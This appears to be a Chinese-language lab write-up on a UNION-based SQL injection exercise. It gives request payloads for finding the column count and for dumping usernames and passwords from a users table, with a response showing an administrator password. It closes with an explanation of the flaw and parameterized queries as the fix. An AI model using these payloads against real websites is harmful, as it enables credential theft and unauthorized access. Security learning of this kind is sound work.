# SQLi · UNION 攻击取数据

日期：2026-10-23　标签：SQLi、UNION攻击

## 1. 题目要求

通过 UNION 攻击获取表信息，登录 administrator 账号。

## 2. payload

### （1）确定列数（若题目未说明）

法一：

```
GET /filter?category=Pets' UNION SELECT NULL,NULL-- HTTP/2
```

状态码为 500 时列数错误，状态码为 200 时列数正确。

法二：

```
GET /filter?category=Pets' ORDER BY 2-- HTTP/2
```

状态码为 500 则大于列数。

### （2）取出 users 表数据

```
GET /filter?category=Pets' UNION SELECT username,password FROM users-- HTTP/2
```

关键 response：

```
                        </tr>
                        <tr>
                            <th>administrator</th>
                            <td>ru1gu73e46e2h4geewj9</td>
                        </tr>
```

## 3. 为什么有效

原始 SQL：

```sql
SELECT name, description FROM products WHERE category = 'Pets' AND released = 1
```

注入后 SQL：

```sql
SELECT name, description FROM products WHERE category = 'Pets'
UNION
SELECT username, password FROM users--' AND released = 1
```

- 上下两个 SELECT 的列数必须相同
- UNION 后两个 SELECT 都执行，结果集纵向合并

## 4. 怎么防

成因：单引号没被当作数据，而被当作代码。

方向：参数化查询，让输入永远是数据，不能改变语句结构。
